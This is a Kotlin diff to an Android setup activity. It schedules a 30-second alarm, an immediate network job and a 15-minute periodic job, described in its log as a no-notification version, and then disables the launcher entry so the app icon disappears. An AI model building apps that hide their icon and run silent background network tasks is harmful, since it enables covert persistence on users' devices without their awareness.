@@ -10,13 +10,16 @@ class SetupActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        FileLog.i(this, "SetupActivity -> init done, hide icon, schedule alarm + kick work")
+        FileLog.i(this, "初始化入口启动：安排3分钟闹钟 + 投递一次联网任务 + 周期保险（无通知版）")
 
-        // 第一次为了“可验证”：1分钟后触发一次（你验收完可改成 DEFAULT_DELAY_MS）
-        AlarmScheduler.ensureNext(this, 60_000L)
+        // ✅ 立刻排第一次（30秒后），便于你立即观察
+        AlarmScheduler.ensureNext(this, 30_000L)
 
-        // 立即 kick 一个联网工作（需要网络才跑）
-        WorkKick.kickNow(this, reason = "setup")
+        // ✅ 立刻踢一次 work（有网就跑）
+        WorkKick.kickNow(this, reason = "初始化入口")
+
+        // ✅ 确保周期保险存在（15分钟一次）
+        WorkKick.ensurePeriodic(this)
 
         disableLauncherAlias()
         finish()
@@ -29,6 +32,6 @@ class SetupActivity : Activity() {
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
             PackageManager.DONT_KILL_APP
         )
-        FileLog.i(this, "LauncherAlias disabled (icon should disappear after launcher refresh)")
+        FileLog.i(this, "桌面入口已禁用：图标应在桌面刷新后消失")
     }
 }
